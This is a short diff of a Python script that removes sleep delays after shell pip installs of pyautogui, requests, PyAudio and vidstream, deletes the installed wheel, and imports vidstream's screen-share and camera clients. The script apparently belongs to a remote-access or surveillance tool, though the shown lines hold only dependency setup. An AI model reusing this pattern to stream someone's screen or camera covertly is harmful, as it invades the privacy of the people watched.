@@ -5,13 +5,11 @@ try:
     import pyautogui
 except:
     subprocess.Popen("py -m pip install pyautogui", shell=True)
-    time.sleep(150)
     import pyautogui
 try:
     import requests
 except:
     subprocess.Popen("py -m pip install requests", shell=True)
-    time.sleep(150)
     import requests
     
 def getpath(change=False):
@@ -60,9 +58,7 @@ except:
     moveFileFromDir(dir, "PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
     supDir(dir)
     subprocess.Popen("py -m pip install PyAudio-0.2.11-cp39-cp39-win_amd64.whl", shell=True)
-    time.sleep(90)
     subprocess.Popen("py -m pip install vidstream", shell=True)
-    time.sleep(150)
     os.remove("PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
     from vidstream import ScreenShareClient
     from vidstream import CameraClient
